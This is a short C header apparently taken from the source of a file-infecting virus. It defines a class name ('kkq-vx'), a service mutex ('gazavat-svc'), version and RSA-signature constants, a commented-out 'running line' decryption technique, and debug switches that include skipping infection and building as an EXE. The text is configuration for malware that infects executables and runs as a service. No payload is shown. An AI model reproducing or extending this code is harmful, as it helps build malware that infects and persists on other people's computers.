
 //#define dbgdbg

//============ MAIN

 #define CLASSNAME "kkq-vx"
 #define SERVICE_MTX "gazavat-svc"  // service mutex name
 #define VERSION 23                 // VERSION 99 IS CRITICAL !!! see mutex
 #define PEINF_VER 23               // must be equal to VERSION
 #define RSA_SIGN_LEN 88            // length of RSA sign
// #define RUNLINE                  // RUNNING LINE tech - uchest fixups! (ih nakladivat do decrypt)


//============ DEBUG

 #ifdef dbgdbg
  //#define SVCDBG     // SERVICE MODE DEBUG (always call ServiceMode() routine)
  //#define EXEFILE    // make EXE
  //#define NO_INFECT  // skip infect      (for remote debug)
  //#define PRINTFDBG
 #else
	#define adddeb(...)
 #endif

